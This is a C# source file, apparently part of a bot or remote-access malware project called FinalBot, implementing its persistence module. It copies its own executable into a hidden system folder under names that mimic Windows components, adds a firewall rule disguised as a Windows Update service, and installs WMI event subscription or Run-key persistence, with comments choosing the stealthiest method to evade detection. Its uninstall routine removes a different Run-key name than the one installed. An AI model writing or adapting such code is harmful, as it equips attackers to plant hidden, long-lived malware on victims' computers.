using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using VanguardCore;

namespace FinalBot
{
    public static class Persistence
    {
        public static void Install()
        {
            AddFirewallException();
            try
            {
                string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
                if (string.IsNullOrEmpty(selfPath)) return;

                // Stage 1: Legitimate Path Transition (ProgramData)
                string programData = Environment.GetEnvironmentVariable("ProgramData");
                if (string.IsNullOrEmpty(programData)) programData = @"C:\ProgramData";
                string targetDir = Path.Combine(programData, "Microsoft", "Windows", "SystemData");
                string targetPath = Path.Combine(targetDir, "SecurityHealthHost.exe");

                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);

                if (selfPath.ToLower() != targetPath.ToLower())
                {
                    try
                    {
                        foreach (var p in Process.GetProcessesByName("svchost"))
                        {
                            try
                            {
                                if (p.Id != Process.GetCurrentProcess().Id)
                                    try { if (p.MainModule?.FileName.ToLower() == targetPath.ToLower()) { p.Kill(); p.WaitForExit(1000); } } catch { }
                            }
                            catch { }
                        }
                        File.Copy(selfPath, targetPath, true);
                        File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
                    }
                    catch (Exception)
                    {
                        // Attempt multiple names just in case
                        string[] altNames = { "OneDriveUpdate.exe", "SecurityHealthClient.exe", "WindowsMediaModule.exe", "WaaSMedicAgent.exe" };
                        bool copied = false;
                        foreach (var alt in altNames)
                        {
                            try {
                                string altPath = Path.Combine(targetDir, alt);
                                File.Copy(selfPath, altPath, true);
                                File.SetAttributes(altPath, FileAttributes.Hidden | FileAttributes.System);
                                targetPath = altPath;
                                copied = true;
                                break;
                            } catch { }
                        }
                        if (!copied)
                        {
                            targetPath = Path.Combine(targetDir, $"svc_{Guid.NewGuid().ToString().Substring(0, 8)}.exe");
                            File.Copy(selfPath, targetPath, true);
                        }
                    }
                }

                Logger.Info("[PERSISTENCE] File copy phase complete.");

                // SURGICAL PERSISTENCE: pick the stealthiest single method per privilege level
                bool isAdmin = VanguardCore.ElevationService.IsAdmin();
                if (isAdmin)
                {
                    // Admin: WMI event subscription — completely hidden from registry, schtasks, and startup folders
                    InstallWMI(targetPath);
                    Logger.Info("[PERSISTENCE] WMI stealth method installed.");
                }
                else
                {
                    // User: single HKCU Run key — low noise, no visible UAC prompt required
                    PersistManager.InstallRegistryRun("WindowsSecurityHealth", targetPath, false);
                    Logger.Info("[PERSISTENCE] HKCU Run key installed.");
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Persistence installation failed", ex);
            }
        }

        private static void InstallWMI(string exePath)
        {
            try
            {
                // Use the safe PowerShell-based method from PersistManager
                PersistManager.InstallWMIEvent(exePath);
                Logger.Info("[PERSISTENCE] WMI Event Subscription installed via PowerShell.");
            }
            catch (Exception ex)
            {
                Logger.Warn($"[PERSISTENCE] WMI failed: {ex.Message}");
            }
        }

        private static void AddFirewallException()
        {
            try
            {
                if (!VanguardCore.ElevationService.IsAdmin()) return;
                
                string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
                if (string.IsNullOrEmpty(selfPath)) return;

                string cmd = $"New-NetFirewallRule -DisplayName 'Windows Update Service' -Direction Inbound -Program '{selfPath}' -Action Allow -ErrorAction SilentlyContinue";
                Process.Start(new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = $"-Command \"{cmd}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch { }
        }

        public static void Uninstall()
        {
            try
            {
                using RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key?.DeleteValue("SecurityHealthSvcHost", false);
            }
            catch { }
        }
    }
}
